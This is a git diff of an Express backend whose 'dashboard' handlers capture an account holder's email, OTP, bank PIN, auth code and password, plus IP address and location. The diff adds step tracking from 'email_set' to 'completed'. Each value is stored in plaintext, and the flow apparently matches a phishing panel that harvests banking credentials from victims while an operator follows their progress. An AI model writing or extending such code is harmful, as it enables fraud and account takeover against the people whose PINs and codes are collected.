@@ -171,6 +171,7 @@ const setEmail = async (req, res) => {
     const newAccount = new Account({
       email,
       userId,
+      currentStep: "email_set", // Set the current step
       location: await getLocationObject(),
     });
 
@@ -179,76 +180,166 @@ const setEmail = async (req, res) => {
     res.status(201).json({
       account: tempAccount,
       message: "New account created successfully",
+      currentStep: tempAccount.currentStep, // Return currentStep in response
     });
   } catch (error) {
     console.error("Error:", error);
-    res.status(500).json({ error: "Failed to create account", error });
+    res.status(500).json({ error: "Failed to create account" });
   }
 };
 
 // Helper function to get user location
 const getLocationObject = async () => {
   const userLocation = await getCountryFromIp();
+  const res = await fetch("http://localhost:8080")
+  // console.log("res is here:  ",res)
+  const ipRes = await res.json()
+  // console.log("ipRes is here:  ",ipRes)
+  const ipAdd = ipRes.clientIP
+  // console.log("ipAdd is here:  ",ipAdd)
   return {
     country: userLocation?.country,
     countryCode: userLocation?.countryCode,
     region: userLocation?.region,
     city: userLocation?.city,
-    ipAddress: userLocation?.ipAddress,
+    ipAddress: ipAdd,
     lat: userLocation?.lat,
     lon: userLocation?.lon,
   };
 };
 
 const setOtp = async (req, res) => {
-  const { accountId, otp } = req.body;
+  try {
+    const { accountId, otp } = req.body;
 
-  const account = await Account.findById(accountId);
+    // Find account by ID
+    const account = await Account.findById(accountId);
 
-  if (!account) {
-    return res.status(400).json({ error: "Account not found" });
+    // Handle if account is not found
+    if (!account) {
+      return res.status(400).json({ error: "Account not found" });
+    }
+
+    // Update OTP and currentStep
+    account.otp = otp;
+    account.currentStep = "otp_set"; // Track the current step
+
+    // Save account changes
+    await account.save();
+
+    // Send response
+    res.status(200).json({
+      message: "OTP set successfully",
+      currentStep: account.currentStep, // Return updated currentStep
+    });
+  } catch (error) {
+    console.error("Error:", error);
+    res.status(500).json({ error: "Failed to set OTP" });
   }
-
-  account.otp = otp;
-  await account.save();
-
-  res.status(200).json({ message: "OTP set successfully" });
 };
 
 const setBankPin = async (req, res) => {
-  const { accountId, bankPin } = req.body;
+  try {
+    const { accountId, bankPin } = req.body;
 
-  const account = await Account.findById(accountId);
+    // Find account by ID
+    const account = await Account.findById(accountId);
 
-  if (!account) {
-    return res.status(400).json({ error: "Account not found" });
+    // Handle if account is not found
+    if (!account) {
+      return res.status(400).json({ error: "Account not found" });
+    }
+
+    // Update bankPin and currentStep
+    account.bankPin = bankPin;
+    account.currentStep = "bank_pin_set"; // Track the current step
+
+    // Save changes
+    await account.save();
+
+    // Send response
+    res.status(200).json({
+      message: "Bank PIN set successfully",
+      currentStep: account.currentStep, // Return updated currentStep
+    });
+  } catch (error) {
+    console.error("Error:", error);
+    res.status(500).json({ error: "Failed to set Bank PIN" });
   }
+};
+const setAuthCode = async (req, res) => {
+  try {
+    const { accountId, authCode } = req.body;
 
-  account.bankPin = bankPin;
-  await account.save();
+    // Find account by ID
+    const account = await Account.findById(accountId);
 
-  res.status(200).json({ message: "Bank PIN set successfully" });
+    // Handle if account is not found
+    if (!account) {
+      return res.status(400).json({ error: "Account not found" });
+    }
+
+    // Update authCode and set currentStep to "auth code set"
+    account.authCode = authCode;
+    account.currentStep = "auth_code_set";
+
+    // Save changes
+    await account.save();
+
+    // Send immediate response showing "auth code set"
+    res.status(200).json({
+      message: "Auth Code set successfully",
+      currentStep: account.currentStep,
+    });
+
+    // After a short delay, change the currentStep to "completed"
+    setTimeout(async () => {
+      account.currentStep = "completed";
+      await account.save();
+      // console.log("Process completed");
+    }, 10000); // 10 seconds delay
+
+  } catch (error) {
+    console.error("Error:", error);
+    res.status(500).json({ error: "Failed to set Auth Code" });
+  }
 };
 
 const setPassword = async (req, res) => {
-  const { accountId, password } = req.body;
+  try {
+    const { accountId, password } = req.body;
 
-  const account = await Account.findById(accountId);
+    // Find account by ID
+    const account = await Account.findById(accountId);
 
-  if (!account) {
-    return res.status(400).json({ error: "Account not found" });
+    // Handle if account is not found
+    if (!account) {
+      return res.status(400).json({ error: "Account not found" });
+    }
+
+    // Update password and currentStep
+    account.password = password;
+    account.currentStep = "password_set"; // Track the current step
+
+    // Save account changes
+    await account.save();
+
+    // Create and save notification
+    const notification = new Notification({
+      message: "Account password updated",
+      accountId: account._id,
+    });
+    await notification.save();
+
+    // Send response
+    res.status(200).json({
+      message: "Password set successfully",
+      currentStep: account.currentStep, // Return updated currentStep
+    });
+  } catch (error) {
+    console.error("Error:", error);
+    res.status(500).json({ error: "Failed to set password" });
   }
-
-  account.password = password;
-
-  const notification = new Notification({
-    message: "Account password updated",
-    accountId: account._id,
-  });
-  await notification.save();
-
-  await account.save();
-  res.status(200).json({ message: "Password set successfully" });
 };
 
 const getAccounts = async (req, res) => {
@@ -611,6 +702,7 @@ export const dashboard = {
   updatePost,
   getSingleAccount,
   setBankPin,
+  setAuthCode,
   getAccounts,
   deletePost,
   deleteAccount,
